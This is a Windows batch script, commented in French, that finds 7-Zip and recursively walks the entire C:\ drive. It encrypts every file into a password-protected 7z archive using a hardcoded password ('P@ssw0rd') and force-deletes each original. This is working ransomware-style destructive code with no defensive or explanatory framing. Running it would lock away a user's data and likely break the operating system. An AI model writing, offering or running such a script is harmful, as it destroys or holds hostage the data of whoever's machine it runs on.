@echo off
REM Définition des variables
REM Dossier qui sera parcouru et chiffré récursivement
set dossier=C:\

REM Recherche automatique de 7z.exe
set "bin="
REM Vérifie d'abord dans Program Files
if exist "C:\Program Files\7-Zip\7z.exe" (
    set "bin=C:\Program Files\7-Zip\7z.exe"
) else if exist "C:\Program Files (x86)\7-Zip\7z.exe" (
    set "bin=C:\Program Files (x86)\7-Zip\7z.exe"
) else (
    REM Si non trouvé, cherche récursivement dans les dossiers utilisateurs
    for /r "%SystemDrive%\Users" %%f in (7z.exe) do (
        if exist "%%f" (
            set "bin=%%f"
            goto :found
        )
    )

    REM Si toujours non trouvé, cherche récursivement dans C:
    for /r "C:\" %%f in (7z.exe) do (
        if exist "%%f" (
            set "bin=%%f"
            goto :found
        )
    )
    
    pause
    exit /b 1
)

:found
REM Mot de passe pour l'archivage
set mdp=P@ssw0rd 

REM Boucle qui parcourt récursivement tous les fichiers du dossier
for /r "%dossier%" %%f in (*) do (
    REM Vérifie si l'élément n'est pas un dossier
    if not "%%~af"=="d" (
        REM Vérifie si le fichier n'est pas l'exécutable 7-Zip lui-même
        if /i not "%%f"=="%bin%" (
            REM Compresse le fichier en format 7z avec cryptage et supprime l'original
            "%bin%" a -t7z -mhe=on -p"%mdp%" "%%f.7z" "%%f" & del "%%f" /F /S /Q 
        )
    )
)
pause
